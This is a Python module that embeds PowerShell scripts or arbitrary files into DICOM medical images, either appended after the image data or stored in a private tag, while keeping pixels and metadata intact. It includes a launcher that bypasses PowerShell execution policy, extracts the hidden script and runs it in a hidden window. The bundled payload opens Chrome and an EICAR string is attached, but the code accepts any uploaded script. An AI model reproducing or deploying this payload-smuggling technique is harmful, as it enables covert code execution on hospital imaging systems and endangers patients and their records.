"""
DICOM embedding engine — EOF-append and private-tag embed modes.

Reference pattern (TCGA-*_modified_embedded_*.dcm): script/file bytes appended after the
original DICOM file, optional FILE_LAUNCHER at EOF; pixels and metadata tags unchanged.
"""

from __future__ import annotations

import hashlib
import io
import json
import os
import sys
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import pydicom

SCRIPT_MAGIC = b"<<<DCM_EMBEDDED_SCRIPT>>>"
FILE_MAGIC = b"<<<DCM_EMBEDDED_FILE>>>"
FILE_LAUNCHER_MAGIC = b"<<<DCM_FILE_LAUNCHER>>>"
PRIVATE_CREATOR = "DEMO_EMBED"
PRIVATE_GROUP = 0x51
EICAR_TEST_STRING = (
    b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
)

CHROME_LAUNCHER_PS1 = """# Security test payload — opens Chrome N times
param([int]$Times = 3)
$chromePaths = @(
    "$env:ProgramFiles\\Google\\Chrome\\Application\\chrome.exe",
    "${env:ProgramFiles(x86)}\\Google\\Chrome\\Application\\chrome.exe",
    "$env:LOCALAPPDATA\\Google\\Chrome\\Application\\chrome.exe"
)
$chrome = $chromePaths | Where-Object { Test-Path $_ } | Select-Object -First 1
if (-not $chrome) {
    $chrome = (Get-Command chrome.exe -ErrorAction SilentlyContinue).Source
}
if (-not $chrome) { throw "Google Chrome not found." }
for ($i = 1; $i -le $Times; $i++) {
    Start-Process -FilePath $chrome
    Start-Sleep -Milliseconds 800
}
"""

FILE_LAUNCHER = """
param([string]$DicomPath = $args[0])
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
$ErrorActionPreference = 'Stop'
if (-not $DicomPath) { throw 'DICOM path required' }
$b = [IO.File]::ReadAllBytes($DicomPath)
$m = [Text.Encoding]::ASCII.GetBytes('<<<DCM_EMBEDDED_SCRIPT>>>')
$found = -1
for ($i = 0; $i -le $b.Length - $m.Length; $i++) {
    $match = $true
    for ($j = 0; $j -lt $m.Length; $j++) {
        if ($b[$i + $j] -ne $m[$j]) { $match = $false; break }
    }
    if ($match) { $found = $i; break }
}
if ($found -lt 0) { throw 'Embedded script not found in DICOM file' }
$start = $found + $m.Length
$len = [BitConverter]::ToInt32($b, $start)
$script = [Text.Encoding]::UTF8.GetString($b, $start + 4, $len)
$payloadPath = Join-Path $env:TEMP ("dcm_payload_{0}.ps1" -f [guid]::NewGuid().ToString('N'))
[IO.File]::WriteAllText($payloadPath, $script)
Unblock-File -LiteralPath $payloadPath -ErrorAction SilentlyContinue
Start-Process -FilePath 'powershell.exe' -ArgumentList @(
    '-NoProfile', '-NoLogo', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-File', $payloadPath
) -WindowStyle Hidden
"""


def embed_output_dir() -> Path:
    out = Path(__file__).resolve().parents[1] / "output" / "embed"
    out.mkdir(parents=True, exist_ok=True)
    return out


@dataclass
class EmbedOptions:
    include_launcher: bool = True
    include_av_test_stream: bool = True
    chrome_open_count: int = 3


def build_chrome_script_bytes(open_count: int = 3) -> bytes:
    script = CHROME_LAUNCHER_PS1.replace(
        "param([int]$Times = 3)", f"param([int]$Times = {open_count})"
    )
    return script.encode("utf-8")


def _parse_script_payload_at(data: bytes, offset: int = 0) -> Optional[Tuple[bytes, int]]:
    if not data[offset:].startswith(SCRIPT_MAGIC):
        return None
    start = offset + len(SCRIPT_MAGIC)
    if len(data) < start + 4:
        return None
    length = int.from_bytes(data[start : start + 4], "little")
    script = data[start + 4 : start + 4 + length]
    return script, start + 4 + length


def _is_script_magic_in_launcher_source(raw: bytes, offset: int) -> bool:
    window = raw[max(0, offset - 48) : offset + len(SCRIPT_MAGIC) + 8]
    return b"GetBytes" in window or b"ASCII.GetBytes" in window


def _is_valid_script_block(raw: bytes, offset: int) -> bool:
    parsed = _parse_script_payload_at(raw, offset)
    if not parsed:
        return False
    script, end_offset = parsed
    if len(script) < 8 or end_offset > len(raw):
        return False
    if _is_script_magic_in_launcher_source(raw, offset):
        return False
    return True


def find_eof_embed_start(raw: bytes) -> int:
    """Byte offset of the first real EOF-appended SCRIPT/FILE block."""
    search_start = 132 if len(raw) >= 132 and raw[128:132] == b"DICM" else 0
    script_idx = raw.find(SCRIPT_MAGIC, search_start)
    while script_idx >= 0:
        if _is_valid_script_block(raw, script_idx):
            try:
                pydicom.dcmread(io.BytesIO(raw[:script_idx]), force=True)
                return script_idx
            except Exception:
                pass
        script_idx = raw.find(SCRIPT_MAGIC, script_idx + 1)
    return len(raw)


def dicom_structure_end(raw: bytes) -> int:
    """Byte offset where demo EOF payloads begin, or full file length for clean/private-tag embeds."""
    eof_start = find_eof_embed_start(raw)
    if eof_start < len(raw):
        return eof_start

    try:
        ds = pydicom.dcmread(io.BytesIO(raw), force=True)
        clean = io.BytesIO()
        ds.save_as(clean, write_like_original=True)
        serialized_len = len(clean.getvalue())
    except Exception:
        serialized_len = len(raw)

    if len(raw) > serialized_len:
        return serialized_len

    try:
        block = ds.private_block(PRIVATE_GROUP, PRIVATE_CREATOR)
        if 0x01 in block:
            payload = bytes(block[0x01].value)
            if SCRIPT_MAGIC in payload or FILE_MAGIC in payload:
                return len(raw)
    except (KeyError, NameError, Exception):
        pass

    search_start = 132 if len(raw) >= 132 and raw[128:132] == b"DICM" else 0
    launcher_idx = raw.find(FILE_LAUNCHER_MAGIC, search_start)
    if launcher_idx >= 0:
        return launcher_idx

    return len(raw)


def build_script_payload(script_bytes: bytes) -> bytes:
    return SCRIPT_MAGIC + len(script_bytes).to_bytes(4, "little") + script_bytes


def build_file_payload(filename: str, file_bytes: bytes) -> bytes:
    name_bytes = filename.encode("utf-8")
    if len(name_bytes) > 65535:
        raise ValueError("Filename too long (max 65535 bytes UTF-8).")
    return (
        FILE_MAGIC
        + len(name_bytes).to_bytes(2, "little")
        + name_bytes
        + len(file_bytes).to_bytes(4, "little")
        + file_bytes
    )


def read_dicom_metadata(ds: pydicom.Dataset) -> Dict[str, str]:
    transfer_syntax = "N/A"
    if hasattr(ds, "file_meta") and ds.file_meta:
        transfer_syntax = str(getattr(ds.file_meta, "TransferSyntaxUID", "N/A"))
    return {
        "patient_name": str(getattr(ds, "PatientName", "N/A")),
        "patient_id": str(getattr(ds, "PatientID", "N/A")),
        "modality": str(getattr(ds, "Modality", "N/A")),
        "study_date": str(getattr(ds, "StudyDate", "N/A")),
        "rows": str(getattr(ds, "Rows", "N/A")),
        "columns": str(getattr(ds, "Columns", "N/A")),
        "transfer_syntax": transfer_syntax,
        "pixel_data_bytes": str(len(getattr(ds, "PixelData", b""))),
    }


def metadata_unchanged(before: Dict[str, str], after: Dict[str, str]) -> bool:
    keys = ("patient_name", "patient_id", "modality", "study_date")
    return all(before[k] == after[k] for k in keys)


def pixels_unchanged(original_bytes: bytes, embedded_bytes: bytes) -> bool:
    """Confirm PixelData element is identical after embed."""
    try:
        orig_ds = pydicom.dcmread(io.BytesIO(original_bytes))
        emb_ds = pydicom.dcmread(io.BytesIO(embedded_bytes))
        if not hasattr(orig_ds, "PixelData") and not hasattr(emb_ds, "PixelData"):
            return True
        return bytes(orig_ds.PixelData) == bytes(emb_ds.PixelData)
    except Exception:
        return False


def attach_av_test_stream(dicom_path: Path) -> bool:
    if sys.platform != "win32":
        return False
    ads_path = f"{dicom_path}:MalwareTestStream"
    with open(ads_path, "wb") as ads_file:
        ads_file.write(EICAR_TEST_STRING)
    return True


def _write_private_tag_embed(ds: pydicom.Dataset, combined: bytes, options: EmbedOptions) -> bytes:
    block = ds.private_block(PRIVATE_GROUP, PRIVATE_CREATOR, create=True)
    block.add_new(0x01, "OB", combined)
    if options.include_launcher and SCRIPT_MAGIC in combined:
        block.add_new(0x02, "OB", FILE_LAUNCHER.strip().encode("utf-8"))

    buffer = io.BytesIO()
    ds.save_as(buffer, write_like_original=False)
    return buffer.getvalue()


def _finalize_embed_result(
    dicom_source: bytes,
    result_bytes: bytes,
    payloads: List[bytes],
    options: EmbedOptions,
    method: str,
) -> Tuple[bytes, Dict[str, Any]]:
    ds = pydicom.dcmread(io.BytesIO(dicom_source))
    before_meta = read_dicom_metadata(ds)
    original_hash = hashlib.sha256(dicom_source).hexdigest()
    combined = b"".join(payloads)

    work_dir = embed_output_dir()
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    temp_path = work_dir / f"_embed_{stamp}.dcm"
    temp_path.write_bytes(result_bytes)

    av_attached = False
    if options.include_av_test_stream:
        av_attached = attach_av_test_stream(temp_path)

    result_bytes = temp_path.read_bytes()
    temp_path.unlink(missing_ok=True)

    after_ds = pydicom.dcmread(io.BytesIO(result_bytes))
    after_meta = read_dicom_metadata(after_ds)

    log = {
        "timestamp": datetime.now().isoformat(),
        "method": method,
        "metadata_unchanged": metadata_unchanged(before_meta, after_meta),
        "pixels_unchanged": pixels_unchanged(dicom_source, result_bytes),
        "hash_original": original_hash,
        "hash_embedded": hashlib.sha256(result_bytes).hexdigest(),
        "dicom_info": before_meta,
        "payload_count": len(payloads),
        "payload_bytes_total": len(combined),
        "original_dicom_bytes": len(dicom_source),
        "embedded_file_bytes": len(result_bytes),
        "include_launcher": options.include_launcher,
        "av_test_stream_attached": av_attached,
        "chrome_open_count": options.chrome_open_count
        if any(p.startswith(SCRIPT_MAGIC) for p in payloads)
        else None,
    }
    return result_bytes, log


def embed_payloads_eof_append(
    dicom_source: bytes,
    payloads: List[bytes],
    options: EmbedOptions,
) -> Tuple[bytes, Dict[str, Any]]:
    """Append payloads after the original DICOM bytes (reference embed pattern)."""
    combined = b"".join(payloads)
    result_bytes = dicom_source + combined
    if options.include_launcher and any(p.startswith(SCRIPT_MAGIC) for p in payloads):
        result_bytes += FILE_LAUNCHER_MAGIC + FILE_LAUNCHER.strip().encode("utf-8")
    return _finalize_embed_result(
        dicom_source, result_bytes, payloads, options, "eof_append_embed"
    )


def embed_payloads_in_dicom(
    dicom_source: bytes,
    payloads: List[bytes],
    options: EmbedOptions,
) -> Tuple[bytes, Dict[str, Any]]:
    """Embed payloads in a private DICOM tag (viewers ignore unknown private tags)."""
    ds = pydicom.dcmread(io.BytesIO(dicom_source))
    combined = b"".join(payloads)
    result_bytes = _write_private_tag_embed(ds, combined, options)
    return _finalize_embed_result(
        dicom_source, result_bytes, payloads, options, "private_tag_embed"
    )


def build_eof_embed_bytes(
    dicom_source: bytes,
    payload: bytes,
    *,
    include_launcher: bool = True,
    include_av_test_stream: bool = False,
) -> Tuple[bytes, Dict[str, Any]]:
    """Convenience wrapper: single payload EOF append with optional auto-run launcher."""
    options = EmbedOptions(
        include_launcher=include_launcher and payload.startswith(SCRIPT_MAGIC),
        include_av_test_stream=include_av_test_stream,
    )
    return embed_payloads_eof_append(dicom_source, [payload], options)


def embed_chrome_launcher(
    dicom_source: bytes,
    options: EmbedOptions,
) -> Tuple[bytes, Dict[str, Any]]:
    script = build_chrome_script_bytes(options.chrome_open_count)
    return embed_payloads_eof_append(dicom_source, [build_script_payload(script)], options)


def embed_uploaded_script(
    dicom_source: bytes,
    script_bytes: bytes,
    options: EmbedOptions,
) -> Tuple[bytes, Dict[str, Any]]:
    return embed_payloads_eof_append(
        dicom_source, [build_script_payload(script_bytes)], options
    )


def embed_uploaded_file(
    dicom_source: bytes,
    filename: str,
    file_bytes: bytes,
    options: EmbedOptions,
) -> Tuple[bytes, Dict[str, Any]]:
    return embed_payloads_eof_append(
        dicom_source, [build_file_payload(filename, file_bytes)], options
    )


def embed_script_and_file(
    dicom_source: bytes,
    script_bytes: bytes,
    filename: str,
    file_bytes: bytes,
    options: EmbedOptions,
) -> Tuple[bytes, Dict[str, Any]]:
    payloads = [build_script_payload(script_bytes), build_file_payload(filename, file_bytes)]
    return embed_payloads_eof_append(dicom_source, payloads, options)


def build_modified_embedded_filename(
    patient_id: str,
    stamp: Optional[str] = None,
) -> str:
    """Filename for reference-pattern embeds: {PatientID}_modified_embedded_{YYYYMMDD_HHMMSS}.dcm"""
    safe = "".join(c if c.isalnum() or c in "-_" else "_" for c in patient_id)
    ts = stamp or datetime.now().strftime("%Y%m%d_%H%M%S")
    return f"{safe}_modified_embedded_{ts}.dcm"


def validate_dicom(dicom_bytes: bytes) -> Tuple[bool, str, Optional[Dict[str, str]]]:
    try:
        ds = pydicom.dcmread(io.BytesIO(dicom_bytes))
        meta = read_dicom_metadata(ds)
        compressed = "1.2.840.10008.1.2.4" in meta.get("transfer_syntax", "")
        note = " (compressed — OK, pixels will not be touched)" if compressed else ""
        return True, f"Valid DICOM file.{note}", meta
    except Exception as error:
        return False, f"Invalid DICOM: {error}", None


def log_to_json(log: Dict[str, Any], extra: Optional[Dict[str, Any]] = None) -> str:
    data = {**log}
    if extra:
        data.update(extra)
    return json.dumps(data, indent=2)


def save_embed_artifacts(
    result_bytes: bytes,
    log: Dict[str, Any],
    source_name: str,
    extra_log: Optional[Dict[str, Any]] = None,
    out_stem: Optional[str] = None,
    patient_id: Optional[str] = None,
) -> Tuple[Path, Path, str, str]:
    """Persist embedded DICOM and JSON log under output/embed/."""
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    if patient_id:
        out_name = build_modified_embedded_filename(patient_id, stamp)
        base = "".join(c if c.isalnum() or c in "-_" else "_" for c in patient_id)
    else:
        base = out_stem or Path(source_name).stem
        out_name = f"{base}_{stamp}.dcm"
    log_name = f"{base}_{stamp}_log.json"
    out_dir = embed_output_dir()
    out_path = out_dir / out_name
    log_path = out_dir / log_name
    out_path.write_bytes(result_bytes)
    log_json = log_to_json(log, extra_log)
    log_path.write_text(log_json, encoding="utf-8")
    return out_path, log_path, out_name, log_json
